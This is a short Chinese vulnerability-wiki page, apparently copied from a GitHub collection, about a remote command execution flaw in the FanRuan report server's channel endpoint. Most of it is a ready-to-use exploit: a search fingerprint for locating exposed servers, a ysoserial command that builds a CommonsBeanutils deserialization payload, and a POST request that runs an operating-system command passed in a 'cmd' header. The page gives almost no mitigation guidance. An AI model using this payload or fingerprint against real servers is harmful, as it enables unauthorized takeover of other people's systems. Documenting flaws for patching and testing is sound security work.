---
title: "帆软报表 channel 远程命令执行漏洞"
date: 2026-10-17 09:12:18
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "帆软报表"
tags:
  - "帆软报表"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

帆软报表 channel 接口存在远程命令执行漏洞, 攻击者通过漏洞可以获取服务器权限，攻击服务器

## 漏洞影响

帆软报表

## 网络测绘

```
"Powered by 帆软"
```

## 漏洞复现

登陆页面

![image-20230828143655329](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828143655329.png)

验证POC

```
java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch "cmd" > fine10.bin

POST /webroot/decision/remote/design/channel HTTP/1.1
Content-Type: application/json
Host: 
cmd: id
Connection: close

{{gzip(file(fine10.bin))}}
```

![image-20230828143710052](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828143710052.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
